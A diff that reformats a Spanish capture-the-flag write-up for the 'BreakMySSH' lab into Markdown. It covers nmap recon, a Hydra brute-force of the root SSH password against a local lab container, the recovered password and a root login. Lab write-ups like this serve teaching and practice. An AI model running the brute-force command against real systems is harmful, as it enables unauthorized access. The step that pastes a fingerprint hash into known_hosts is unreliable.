@@ -1,16 +1,28 @@
-BreakMySSh
+# BreakMySSH
 
-se hace ping ttl 64 es Linux
+## Reconocimiento Inicial
 
-el nmap dice que el puerto 22 esta abierto ssh
+### Identificación del sistema
+- **Ping**: TTL 64 → Sistema Linux
+- **Nmap**: Puerto 22 abierto (SSH)
 
-no se tiene usuario en este caso pero se puede probar con root, hacer un ataque de fuerza bruta con hydra poniendo el usuario root
+## Acceso por Fuerza Bruta
 
+### Ataque Hydra
+Como no se tiene un usuario conocido, se intenta con `root`:
+
+```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -v
+```
 
-Encuentra la contra de root que es estrella pero dice esto 
+**Resultado**: Contraseña encontrada: `estrella`
 
-└─$ ssh root@172.17.0.2 
+## Resolución de Problemas de Host Key
+
+### Error inicial
+Al intentar conectar aparece un error de host key verification:
+
+```
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -26,41 +38,41 @@ Offending ECDSA key in /home/kali/.ssh/known_hosts:3
   ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
 Host key for 172.17.0.2 has changed and you have requested strict checking.
 Host key verification failed.
+```
 
-Para arreglar esto eliminamos las keys que estan en el archivo ssh-keygen asi 
+### Solución
 
-└─$ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
+**Paso 1**: Eliminar la clave anterior del archivo `known_hosts`
 
-Despues hay que moverse a esa carpeta y editar el archivo 
-┌──(kali㉿kali)-[~]
-└─$ cd ..
-                                                                                                                                                 
-┌──(kali㉿kali)-[/home]
-└─$ ls
-kali
-                                                                                                                                                 
-┌──(kali㉿kali)-[/home]
-└─$ cd kali
-                                                                                                                                                 
-┌──(kali㉿kali)-[~]
-└─$ cd .ssh
-                                                                                                                                                 
-┌──(kali㉿kali)-[~/.ssh]
-└─$ ls
-agent  known_hosts  known_hosts.old
-                                                                                                                                                 
-┌──(kali㉿kali)-[~/.ssh]
-└─$ nano known_hosts 
+```bash
+ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
+```
 
-para poner esto
+**Paso 2**: Navegar al directorio SSH y editar el archivo
 
-U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
+```bash
+cd ~/.ssh
+ls
+# Output: agent  known_hosts  known_hosts.old
 
-Y asi nos podemos conectar por ssh como root 
+nano known_hosts
+```
 
-┌──(kali㉿kali)-[~/.ssh]
-└─$ ssh root@172.17.0.2                                        
+**Paso 3**: Agregar la nueva fingerprint de la clave ED25519
 
+```
+SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ
+```
+
+## Conexión Exitosa
+
+### Conexión SSH
+```bash
+ssh root@172.17.0.2
+```
+
+**Confirmación de autenticidad**:
+```
 The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
 ED25519 key fingerprint is: SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ
 This key is not known by any other names.
@@ -69,14 +81,31 @@ Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-root@172.17.0.2's password: 
+```
 
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
+**Ingreso de contraseña**:
+```
+root@172.17.0.2's password: [estrella]
+```
 
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-root@34ed3d3ab280:~# whoami
-root
+### Verificación de acceso
+```bash
+whoami
+# Output: root
+```
+
+**Terminal remota accesible**:
+```
 root@34ed3d3ab280:~# 
+```
+
+## Resumen
+
+✅ **Objetivo logrado**: Acceso SSH como usuario `root` en la máquina `172.17.0.2`
+
+| Paso | Acción |
+|------|--------|
+| 1 | Reconocimiento (ping, nmap) |
+| 2 | Ataque de fuerza bruta con Hydra |
+| 3 | Resolución de conflicto de host key |
+| 4 | Conexión SSH exitosa |
